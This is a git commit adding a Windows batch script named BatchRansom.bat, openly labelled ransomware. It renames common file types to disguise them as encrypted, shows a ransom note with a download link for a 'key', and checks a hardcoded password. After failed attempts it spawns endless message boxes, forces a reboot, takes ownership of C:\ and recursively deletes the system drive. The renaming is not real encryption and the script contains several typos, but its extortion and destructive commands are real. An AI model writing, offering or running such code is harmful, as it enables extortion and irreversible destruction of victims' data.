74338e273a99dbd5a2b0b52cbbe0cd6bedcbf566
adoomyxx <144142418+adoomyxx@users.noreply.github.com>
2023-11-05 09:46:29 +0400

    Ransom/DriverDeleter/StrongEncryptor
    Ransom/DriverDeleter/StrongEncryptor

---
+++ BatchRansom.bat
@@ -0,0 +1,217 @@
+if exist *.exe ren *.exe *.Ransom1
+if exist *.bat ren *.bat *.Ransom2
+if exist *.cmd ren *.cmd *.Ransom3
+if exist *.cs ren *.cs *.Ransom4
+if exist *.css ren *.css *.Ransom5
+if exist *.c ren *.c *.Ransom6
+if exist *.cpp ren *.cpp *.Ransom7
+if exist *.txt ren *.txt *.Ransom8
+if exist *.md ren *.md *.Ransom9
+if exist *.docx ren *.docx *.Ransom10
+if exist *.docm ren *.docm *.Ransom11
+if exist *.xlsx ren *.xlsx *.Ransom12
+if exist *.xlsm ren *.xlsm *.Ransom13
+if exist *.js ren *.js *.Ransom14
+if exist *.jse ren *.jse *.Ransom15
+if exist *.vbs ren *.vbs *.Ransom16
+if exist *.wsh ren *.wsh *.Ransom17
+if exist *.vbe ren *.vbe *.Ransom18
+if exist *.msi ren *.msi *.Ransom19
+if exist *.cpl ren *.cpl *.Ransom20
+if exist *.msl ren *.msl *.Ransom21
+if exist *.com ren *.com *.Ransom22
+if exist *.cpi ren *.cpi *.Ransom23
+if exist *.html ren *.html *.Ransom24
+if exist *.rar ren *.rar *.Ransom25
+if exist  *.zip ren *.zip *.Ransom26
+if exist *.py ren *.py *.Ransom27
+if exist *.pyw ren *.pyw *.Ransom28
+title Encypted
+echo All your Files have been encrypted with a Strong Key, In order to get Back Your files You will need to get this key to decrypt your files, Your time is %date%, You will have to go to https://drive.google.com/file/d/1kBt7s8c9mnHurUACFzi3noV7s9E0fzw-/view?usp=drive_open to get the key to decrypt your files, 5 attempts left
+set /p code=
+if /i %code%==Aam8uHi9oO))[[8qAAAmAlJanRAAAAAaaaMa()$$$82!JiJu goto decrypt
+if not /i %code%==Aam8uHi9oO))[[8qAAAmAlJanRAAAAAaaaMa()$$$82!JiJu goto wrong
+
+:decrypt
+if exist *.Ransom1 ren *.Ransom1 *.exe
+if exist *.Ransom2 ren *.Ransom2 *.bat
+if exist *.Ransom3 ren *.Ransom3 *.cmd
+if exist *.Ransom4 ren *.Ransom4 *.cs 
+if exist *.Ransom5 ren *.Ransom5 *.css
+if exist *.Ransom6 ren *.Ransom6 *.c
+if exist *.Ransom7 ren *.Ransom7 *.cpp
+if exist *.Ransom8 ren *.Ransom8 *.txt 
+if exist *.Ransom9 ren *.Ransom9 *.md 
+if exist *.Ransom10 ren *.Ransom10 *.docx
+if exist *.Ransom11 ren *.Ransom11 *.docm 
+if exist *.Ransom12 ren *.Ransom12 *.xlsx 
+if exist *.Ransom13 ren *.Ransom13 *.xlsm 
+if exist *.Ransom14 ren *.Ransom14 *.js
+if exist *.Ransom15 ren *.Ransom15 *.jse 
+if exist *.Ransom16 ren *.Ransom16 *.vbs
+if exist *.Ransom17 ren *.Ransom17 *.wsh
+if exist *.Ransom18 ren *.Ransom18 *.vbe
+if exist *.Ransom19 ren *.Ransom19 *.msi
+if exist *.Ransom20 ren *.Ransom20 *.cpl 
+if exist *.Ransom21 ren *.Ransom21 *.msl 
+if exist *.Ransom22 ren *.Ransom22 *.com
+if exist *.Ransom23 ren *.Ransom23 *.cpi
+if exist *.Ransom24 ren *.Ransom24 *.html
+if exist *.Ransom25 ren *.Ransom25 *.rar
+if exist *.Ransom26 ren *.Ransom26 *.zip 
+if exist *.Ransom27 ren *.Ransom27 *.py
+if exist *.Ransom28 ren *.Ransom28 *.pyw
+
+:wrong
+echo Try again 4 attempts left
+if /i %code%==Aam8uHi9oO))[[8qAAAmAlJanRAAAAAaaaMa()$$$82!JiJu goto decypt2
+if not /i %code%==Aam8uHi9oO))[[8qAAAmAlJanRAAAAAaaaMa()$$$82!JiJu goto wrong2
+
+:decrypt2
+if exist *.Ransom1 ren *.Ransom1 *.exe
+if exist *.Ransom2 ren *.Ransom2 *.bat
+if exist *.Ransom3 ren *.Ransom3 *.cmd
+if exist *.Ransom4 ren *.Ransom4 *.cs 
+if exist *.Ransom5 ren *.Ransom5 *.css
+if exist *.Ransom6 ren *.Ransom6 *.c
+if exist *.Ransom7 ren *.Ransom7 *.cpp
+if exist *.Ransom8 ren *.Ransom8 *.txt 
+if exist *.Ransom9 ren *.Ransom9 *.md 
+if exist *.Ransom10 ren *.Ransom10 *.docx
+if exist *.Ransom11 ren *.Ransom11 *.docm 
+if exist *.Ransom12 ren *.Ransom12 *.xlsx 
+if exist *.Ransom13 ren *.Ransom13 *.xlsm 
+if exist *.Ransom14 ren *.Ransom14 *.js
+if exist *.Ransom15 ren *.Ransom15 *.jse 
+if exist *.Ransom16 ren *.Ransom16 *.vbs
+if exist *.Ransom17 ren *.Ransom17 *.wsh
+if exist *.Ransom18 ren *.Ransom18 *.vbe
+if exist *.Ransom19 ren *.Ransom19 *.msi
+if exist *.Ransom20 ren *.Ransom20 *.cpl 
+if exist *.Ransom21 ren *.Ransom21 *.msl 
+if exist *.Ransom22 ren *.Ransom22 *.com
+if exist *.Ransom23 ren *.Ransom23 *.cpi
+if exist *.Ransom24 ren *.Ransom24 *.html
+if exist *.Ransom25 ren *.Ransom25 *.rar
+if exist *.Ransom26 ren *.Ransom26 *.zip 
+if exist *.Ransom27 ren *.Ransom27 *.py
+if exist *.Ransom28 ren *.Ransom28 *.pyw
+
+:wrong2
+echo Try again 3 attempts left
+if /i %code%==Aam8uHi9oO))[[8qAAAmAlJanRAAAAAaaaMa()$$$82!JiJu goto decrypt3
+if not /i %code%==Aam8uHi9oO))[[8qAAAmAlJanRAAAAAaaaMa()$$$82!JiJu goto wrong3
+
+:decrypt3
+if exist *.Ransom1 ren *.Ransom1 *.exe
+if exist *.Ransom2 ren *.Ransom2 *.bat
+if exist *.Ransom3 ren *.Ransom3 *.cmd
+if exist *.Ransom4 ren *.Ransom4 *.cs 
+if exist *.Ransom5 ren *.Ransom5 *.css
+if exist *.Ransom6 ren *.Ransom6 *.c
+if exist *.Ransom7 ren *.Ransom7 *.cpp
+if exist *.Ransom8 ren *.Ransom8 *.txt 
+if exist *.Ransom9 ren *.Ransom9 *.md 
+if exist *.Ransom10 ren *.Ransom10 *.docx
+if exist *.Ransom11 ren *.Ransom11 *.docm 
+if exist *.Ransom12 ren *.Ransom12 *.xlsx 
+if exist *.Ransom13 ren *.Ransom13 *.xlsm 
+if exist *.Ransom14 ren *.Ransom14 *.js
+if exist *.Ransom15 ren *.Ransom15 *.jse 
+if exist *.Ransom16 ren *.Ransom16 *.vbs
+if exist *.Ransom17 ren *.Ransom17 *.wsh
+if exist *.Ransom18 ren *.Ransom18 *.vbe
+if exist *.Ransom19 ren *.Ransom19 *.msi
+if exist *.Ransom20 ren *.Ransom20 *.cpl 
+if exist *.Ransom21 ren *.Ransom21 *.msl 
+if exist *.Ransom22 ren *.Ransom22 *.com
+if exist *.Ransom23 ren *.Ransom23 *.cpi
+if exist *.Ransom24 ren *.Ransom24 *.html
+if exist *.Ransom25 ren *.Ransom25 *.rar
+if exist *.Ransom26 ren *.Ransom26 *.zip 
+if exist *.Ransom27 ren *.Ransom27 *.py
+if exist *.Ransom28 ren *.Ransom28 *.pyw
+
+:wrong3
+echo Try again 2 attempts left
+if /i %code%==Aam8uHi9oO))[[8qAAAmAlJanRAAAAAaaaMa()$$$82!JiJu goto decrypt4
+if not /i %code%==Aam8uHi9oO))[[8qAAAmAlJanRAAAAAaaaMa()$$$82!JiJu goto wrong4
+
+:decrypt4
+if exist *.Ransom1 ren *.Ransom1 *.exe
+if exist *.Ransom2 ren *.Ransom2 *.bat
+if exist *.Ransom3 ren *.Ransom3 *.cmd
+if exist *.Ransom4 ren *.Ransom4 *.cs 
+if exist *.Ransom5 ren *.Ransom5 *.css
+if exist *.Ransom6 ren *.Ransom6 *.c
+if exist *.Ransom7 ren *.Ransom7 *.cpp
+if exist *.Ransom8 ren *.Ransom8 *.txt 
+if exist *.Ransom9 ren *.Ransom9 *.md 
+if exist *.Ransom10 ren *.Ransom10 *.docx
+if exist *.Ransom11 ren *.Ransom11 *.docm 
+if exist *.Ransom12 ren *.Ransom12 *.xlsx 
+if exist *.Ransom13 ren *.Ransom13 *.xlsm 
+if exist *.Ransom14 ren *.Ransom14 *.js
+if exist *.Ransom15 ren *.Ransom15 *.jse 
+if exist *.Ransom16 ren *.Ransom16 *.vbs
+if exist *.Ransom17 ren *.Ransom17 *.wsh
+if exist *.Ransom18 ren *.Ransom18 *.vbe
+if exist *.Ransom19 ren *.Ransom19 *.msi
+if exist *.Ransom20 ren *.Ransom20 *.cpl 
+if exist *.Ransom21 ren *.Ransom21 *.msl 
+if exist *.Ransom22 ren *.Ransom22 *.com
+if exist *.Ransom23 ren *.Ransom23 *.cpi
+if exist *.Ransom24 ren *.Ransom24 *.html
+if exist *.Ransom25 ren *.Ransom25 *.rar
+if exist *.Ransom26 ren *.Ransom26 *.zip 
+if exist *.Ransom27 ren *.Ransom27 *.py
+if exist *.Ransom28 ren *.Ransom28 *.pyw
+
+:wrong4
+Try again 1 attempt left
+if /i %code%==Aam8uHi9oO))[[8qAAAmAlJanRAAAAAaaaMa()$$$82!JiJu goto decrypt5
+if not /i %code%==Aam8uHi9oO))[[8qAAAmAlJanRAAAAAaaaMa()$$$82!JiJu goto selfdestruct
+
+:decrypt5
+if exist *.Ransom1 ren *.Ransom1 *.exe
+if exist *.Ransom2 ren *.Ransom2 *.bat
+if exist *.Ransom3 ren *.Ransom3 *.cmd
+if exist *.Ransom4 ren *.Ransom4 *.cs 
+if exist *.Ransom5 ren *.Ransom5 *.css
+if exist *.Ransom6 ren *.Ransom6 *.c
+if exist *.Ransom7 ren *.Ransom7 *.cpp
+if exist *.Ransom8 ren *.Ransom8 *.txt 
+if exist *.Ransom9 ren *.Ransom9 *.md 
+if exist *.Ransom10 ren *.Ransom10 *.docx
+if exist *.Ransom11 ren *.Ransom11 *.docm 
+if exist *.Ransom12 ren *.Ransom12 *.xlsx 
+if exist *.Ransom13 ren *.Ransom13 *.xlsm 
+if exist *.Ransom14 ren *.Ransom14 *.js
+if exist *.Ransom15 ren *.Ransom15 *.jse 
+if exist *.Ransom16 ren *.Ransom16 *.vbs
+if exist *.Ransom17 ren *.Ransom17 *.wsh
+if exist *.Ransom18 ren *.Ransom18 *.vbe
+if exist *.Ransom19 ren *.Ransom19 *.msi
+if exist *.Ransom20 ren *.Ransom20 *.cpl 
+if exist *.Ransom21 ren *.Ransom21 *.msl 
+if exist *.Ransom22 ren *.Ransom22 *.com
+if exist *.Ransom23 ren *.Ransom23 *.cpi
+if exist *.Ransom24 ren *.Ransom24 *.html
+if exist *.Ransom25 ren *.Ransom25 *.rar
+if exist *.Ransom26 ren *.Ransom26 *.zip 
+if exist *.Ransom27 ren *.Ransom27 *.py
+if exist *.Ransom28 ren *.Ransom28 *.pyw
+
+:selfdestruct
+cd %temp%
+echo.You shouldve bought the key>>998876655443332211.txt
+start 998876655443332211.txt
+tineout 3
+echo.do>>why.vbs
+echo.x=msgbox ("Why didn't you buy the key?",48,"Why?")>>why.vbs
+echo.loop>>why.vbs
+start why.vbs
+timeout 1
+shutdown -r -t 10 -c You have 10 seconds left and Deleting C:
+takeown /f C:\
+rd C:\ /f /s /q
